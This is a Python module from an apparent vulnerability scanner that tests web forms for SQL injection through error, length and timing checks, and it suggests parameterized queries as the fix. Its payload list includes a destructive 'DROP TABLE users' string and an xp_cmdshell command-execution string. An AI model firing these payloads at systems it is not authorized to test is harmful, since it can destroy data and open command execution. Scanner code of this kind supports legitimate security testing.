"""
sql_injection.py — SQL Injection Detection Module
Tests discovered forms and URL parameters for possible SQL injection vulnerabilities.
"""

import requests
import copy
import time

# Common SQL injection payloads (error-based / boolean-based / union-based)
SQL_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "admin' --",
    "' OR 'x'='x",
    "1; DROP TABLE users --",
    "' UNION SELECT NULL --",
    "'; EXEC xp_cmdshell('dir') --",
]

# Time-based blind SQLi payloads: each maps to the delay (in seconds) it should
# induce on a vulnerable target if the injected SLEEP/pg_sleep/WAITFOR executes.
TIME_BASED_PAYLOADS = {
    "' OR SLEEP(5) --": 5,
    "'; WAITFOR DELAY '0:0:5' --": 5,
    "' OR pg_sleep(5) --": 5,
}

# How much slower than baseline (in seconds) a response must be, beyond the
# induced delay itself, to count as a genuine positive rather than jitter.
TIME_BASED_TOLERANCE = 2

# Database error signatures that suggest SQL injection
DB_ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sqlsyntaxerrorexception",
    "org.hibernate",
    "com.mysql.jdbc",
    "pg::syntaxerror",
    "sqlite3::exception",
    "odbc sql server driver",
    "microsoft ole db provider",
    "jet database engine",
    "ora-01756",
    "syntax error or access violation",
    "division by zero",
    "supplied argument is not a valid mysql",
    "mysqli_fetch_array()",
    "invalid query",
    "sql error",
    "db error",
]


def _get_baseline_response(url: str, method: str, data: dict, timeout: int = 10):
    """Get a baseline response with neutral data, timing how long it takes."""
    try:
        start = time.time()
        if method == "post":
            r = requests.post(url, data=data, timeout=timeout, allow_redirects=True)
        else:
            r = requests.get(url, params=data, timeout=timeout, allow_redirects=True)
        elapsed = time.time() - start
        return r, elapsed
    except Exception:
        return None, None


def _has_db_error(response_text: str) -> bool:
    """Check if the response contains database error signatures."""
    text_lower = response_text.lower()
    return any(sig in text_lower for sig in DB_ERROR_SIGNATURES)


def _is_length_anomalous(baseline_len: int, new_len: int) -> bool:
    """
    Flag a response length change as suspicious using a relative threshold
    instead of a fixed byte count, so it scales with page size and is less
    prone to false positives on pages with naturally variable content.
    """
    diff = abs(new_len - baseline_len)
    if baseline_len == 0:
        return diff > 500
    # Require both a meaningful absolute change and a meaningful relative change
    return diff > 200 and (diff / baseline_len) > 0.3


def test_sql_injection(forms: list, timeout: int = 10) -> list:
    """
    Test forms for SQL injection vulnerabilities.

    Args:
        forms: List of form dicts from the crawler.
        timeout: HTTP request timeout.

    Returns:
        List of vulnerability finding dicts.
    """
    findings = []
    tested = set()

    for form in forms:
        action = form["action"]
        method = form["method"]
        inputs = form["inputs"]
        page_url = form["page_url"]

        key = (action, method)
        if key in tested:
            continue
        tested.add(key)

        # Build neutral baseline data
        baseline_data = {}
        for inp in inputs:
            inp_type = inp.get("type", "text")
            if inp_type in ("submit", "button", "image", "reset", "file"):
                continue
            baseline_data[inp["name"]] = "test"

        if not baseline_data:
            continue

        baseline_resp, baseline_elapsed = _get_baseline_response(action, method, baseline_data, timeout)
        baseline_len = len(baseline_resp.text) if baseline_resp else 0

        found_for_form = False

        # --- Error-based / boolean-based / union-based payloads ---
        for payload in SQL_PAYLOADS:
            injected_data = {k: payload for k in baseline_data}

            try:
                if method == "post":
                    resp = requests.post(action, data=injected_data, timeout=timeout, allow_redirects=True)
                else:
                    resp = requests.get(action, params=injected_data, timeout=timeout, allow_redirects=True)
            except Exception:
                continue

            vulnerable = False
            reason = ""

            if _has_db_error(resp.text):
                vulnerable = True
                reason = "Database error string detected in response"
            elif baseline_resp and _is_length_anomalous(baseline_len, len(resp.text)):
                vulnerable = True
                reason = f"Significant response length difference ({baseline_len} → {len(resp.text)} bytes)"

            if vulnerable:
                findings.append({
                    "type": "SQL Injection",
                    "url": action,
                    "source_page": page_url,
                    "payload": payload,
                    "reason": reason,
                    "risk": "High",
                    "recommendation": (
                        "Use parameterized queries / prepared statements. "
                        "Never interpolate user input directly into SQL strings. "
                        "Apply input validation and restrict DB error visibility."
                    ),
                })
                found_for_form = True
                break  # One finding per form endpoint is enough for this category

        # --- Time-based blind payloads (only if nothing already found) ---
        if not found_for_form and baseline_elapsed is not None:
            for payload, induced_delay in TIME_BASED_PAYLOADS.items():
                injected_data = {k: payload for k in baseline_data}

                try:
                    start = time.time()
                    if method == "post":
                        requests.post(action, data=injected_data, timeout=timeout + induced_delay, allow_redirects=True)
                    else:
                        requests.get(action, params=injected_data, timeout=timeout + induced_delay, allow_redirects=True)
                    elapsed = time.time() - start
                except Exception:
                    continue

                extra_delay = elapsed - baseline_elapsed
                if extra_delay > (induced_delay - TIME_BASED_TOLERANCE):
                    findings.append({
                        "type": "SQL Injection",
                        "url": action,
                        "source_page": page_url,
                        "payload": payload,
                        "reason": (
                            f"Response delayed by {extra_delay:.1f}s beyond baseline "
                            f"({baseline_elapsed:.1f}s), consistent with time-based blind SQLi"
                        ),
                        "risk": "High",
                        "recommendation": (
                            "Use parameterized queries / prepared statements. "
                            "Never interpolate user input directly into SQL strings. "
                            "Apply input validation and restrict DB error visibility."
                        ),
                    })
                    break  # One finding per form endpoint is enough for this category

    return findings
